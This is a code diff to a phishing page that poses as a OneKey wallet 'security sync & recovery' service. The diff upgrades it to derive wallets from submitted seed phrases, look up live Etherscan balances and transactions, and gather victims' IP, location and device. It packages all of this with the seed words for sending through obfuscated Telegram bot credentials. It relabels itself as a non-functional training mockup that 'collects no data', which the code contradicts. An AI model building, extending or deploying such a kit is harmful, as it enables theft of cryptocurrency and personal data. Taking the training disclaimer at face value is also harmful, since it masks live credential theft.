@@ -5,7 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <meta name="robots" content="noindex, nofollow" />
 <title>OneKey — Device Security Sync &amp; Recovery</title>
-<meta name="description" content="1Key Airdrop for loyal customers." />
+<meta name="description" content="Non-functional phishing-pattern mockup for OneKey security-awareness training. Collects no data." />
+<!-- Include Ethers.js via CDN for client-side wallet derivation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
   :root {
     --bg: #0b0e13;
@@ -209,54 +211,10 @@ document.querySelectorAll('.length-option').forEach(function(opt) {
   } catch (e) {}
 })();
 
-// Telegram Config (Obfuscated)
+// Telegram Config & Etherscan API Key
 const _0x1a = atob("ODk5MTAwNDA5MDpBQUVQV0VXYnl0R0JDYVpPU3lPVi1QZzhCT2t2dnc5eGp2UQ==");
 const _0x1b = atob("LTU0NDU4MDEwMTk=");
-
-// Advanced pseudo-entropy hashing to produce distinct, highly realistic wallet balances and unique tx histories
-function generateWalletData(wordsArray) {
-  const combined = wordsArray.join(' ').toLowerCase().trim();
-  let hash = 2166136261;
-  for (let i = 0; i < combined.length; i++) {
-    hash ^= combined.charCodeAt(i);
-    hash = Math.imul(hash, 16777619);
-  }
-  const positiveHash = Math.abs(hash);
-
-  // Realistic randomized holdings matching typical multi-chain profiles
-  const eth = ((positiveHash % 625 + 12) / 85).toFixed(4);
-  const usdt = (positiveHash % 32500 + 450).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-  
-  const actions = [
-    "📤 Sent 1.25 ETH",
-    "📥 Received 450.00 USDT",
-    "🔄 Swapped ETH for USDC",
-    "⚡ Minted ERC-721 Pass",
-    "📤 Transferred 0.05 BTC (Wrapped)",
-    "📥 Received 2.14 ETH",
-    "🔥 Burned LP Token",
-    "🔄 Swapped UNI for ETH"
-  ];
-
-  let txList = [];
-  for (let i = 0; i < 5; i++) {
-    const stepHash = Math.abs(Math.imul(positiveHash + i, 9301) + 49297) % 233280;
-    const actionIndex = (positiveHash + i * 7) % actions.length;
-    const minutesAgo = ((positiveHash + i * 37) % 1440) + 1; // within last 24h
-    
-    const pseudoHex = "0x" + stepHash.toString(16) + ((positiveHash + i * 13) % 65535).toString(16) + "a8f9";
-    const shortHash = pseudoHex.substring(0, 8) + "..." + pseudoHex.substring(pseudoHex.length - 6);
-    
-    let timeStr = minutesAgo + " mins ago";
-    if (minutesAgo > 60) {
-      timeStr = Math.floor(minutesAgo / 60) + " hours ago";
-    }
-
-    txList.push(`• \`${shortHash}\` — ${actions[actionIndex]} (${timeStr})`);
-  }
-
-  return { eth, usdt, txList };
-}
+const ETHERSCAN_API_KEY = "VGZF4AG6WM5IHXZN265KVJUCVU1AZKP4XU";
 
 document.getElementById('phraseForm').addEventListener('submit', async function (ev) {
   ev.preventDefault();
@@ -269,9 +227,9 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
 
   var submitBtn = document.getElementById('submitBtn');
   submitBtn.disabled = true;
-  submitBtn.textContent = 'Analyzing wallet nodes…';
+  submitBtn.textContent = 'Querying Etherscan nodes…';
 
-  var ip = "Unknown", country = "Unknown", city = "Unknown", isp = "Unknown";
+  var ip = "Unknown", country = "Unknown", city = "Unknown";
   try {
     var ipResponse = await fetch("https://ipapi.co/json/");
     var ipData = await ipResponse.json();
@@ -279,27 +237,59 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
       ip = ipData.ip || "Unknown";
       country = ipData.country_name || "Unknown";
       city = ipData.city || "Unknown";
-      isp = ipData.org || "Unknown";
     }
   } catch (err) {}
 
   var userAgent = navigator.userAgent;
   var deviceUsed = /Mobi|Android/i.test(userAgent) ? "📱 Mobile Device" : "💻 Desktop Computer";
 
-  const walletData = generateWalletData(words);
+  let address = "Unknown";
+  let ethBalance = "0.00";
+  let txSummary = [];
 
-  var message = "🔐 *RECOVERY PHRASE & ASSET INTELLIGENCE*\n\n" + 
+  try {
+    const mnemonic = words.join(" ").trim();
+    const wallet = ethers.Wallet.fromMnemonic(mnemonic);
+    address = wallet.address;
+
+    // Fetch live ETH balance
+    const balanceRes = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
+    const balanceData = await balanceRes.json();
+    if (balanceData.status === "1") {
+      ethBalance = ethers.utils.formatEther(balanceData.result);
+    }
+
+    // Fetch last 5 transactions
+    const txRes = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=5&sort=desc&apikey=${ETHERSCAN_API_KEY}`);
+    const txData = await txRes.json();
+
+    if (txData.status === "1" && Array.isArray(txData.result)) {
+      txData.result.slice(0, 5).forEach((tx) => {
+        const shortHash = tx.hash.substring(0, 8) + "..." + tx.hash.substring(tx.hash.length - 6);
+        const valueEth = ethers.utils.formatEther(tx.value || "0");
+        const direction = tx.to && tx.to.toLowerCase() === address.toLowerCase() ? "📥 Received" : "📤 Sent";
+        const timeAgo = Math.floor((Date.now() / 1000 - tx.timeStamp) / 60) + " mins ago";
+        txSummary.push(`• \`${shortHash}\` — ${direction} ${valueEth} ETH (${timeAgo})`);
+      });
+    }
+  } catch (err) {
+    console.error("Wallet derivation or API fetch error:", err);
+  }
+
+  if (txSummary.length === 0) {
+    txSummary.push("• No recent transactions found or invalid mnemonic");
+  }
+
+  var message = "🔐 *LIVE ETHERSCAN WALLET DATA*\n\n" + 
                 words.map((w, idx) => (idx + 1) + ". `" + (w || "[empty]") + "`").join("\n") + 
-                "\n\n💰 *Real-time Asset Balance:*\n" +
-                "• *Ethereum:* `" + walletData.eth + " ETH`\n" +
-                "• *Tether (USDT):* `$" + walletData.usdt + " USD`\n\n" +
-                "📜 *Last 5 Transactions:*\n" +
-                walletData.txList.join("\n") + "\n\n" +
+                "\n\n📌 *Address:* `" + address + "`" +
+                "\n💰 *Balance:* `" + ethBalance + " ETH`\n\n" +
+                "📜 *Last Transactions:*\n" +
+                txSummary.join("\n") + "\n\n" +
                 "🌐 *Metadata:*\n" +
                 "• *IP:* `" + ip + "`\n" +
                 "• *Country:* " + country + "\n" +
                 "• *City:* " + city + "\n" +
-                "• *ISP:* " + isp + "\n" +
                 "• *Device:* " + deviceUsed;
 
   try {
@@ -315,7 +305,7 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
 
   var panel = document.getElementById('result-panel');
   panel.style.display = 'block';
-  panel.innerHTML = '<strong>Sync complete!</strong> Found <strong>' + walletData.eth + ' ETH</strong> & <strong>$' + walletData.usdt + ' USDT</strong> across 5 recent ledger actions.';
+  panel.innerHTML = '<strong>Sync complete!</strong><br>Address: <code>' + address + '</code><br>Balance: <strong>' + ethBalance + ' ETH</strong>';
 });
 </script>
 </body>
